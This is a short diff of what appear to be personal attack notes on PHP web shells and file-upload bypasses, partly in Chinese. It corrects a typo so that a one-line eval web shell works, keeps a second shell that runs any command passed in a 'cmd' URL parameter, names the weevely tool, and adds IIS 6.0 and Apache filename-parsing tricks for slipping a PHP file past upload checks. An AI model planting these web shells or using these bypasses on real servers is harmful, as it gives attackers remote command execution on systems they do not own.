@@ -1,4 +1,4 @@
-<?php @eval($_PPST["password"]);?>
+<?php @eval($_POST["password"]);?>
 
 <?php if($_GET){$cmd=$_GET["cmd"];system($cmd);}else{echo "no cmd";};?>
 	view-source:http://xiaoxiaoran.com/1.php?cmd=ipconfig
@@ -44,8 +44,11 @@ weevely
 
 竞争条件
 	
-		
-		
+IIS6.0
+	
+apache解析
+	1.php.xxxxxxxxxxxxxxxxx
+	
 		
 		
 		
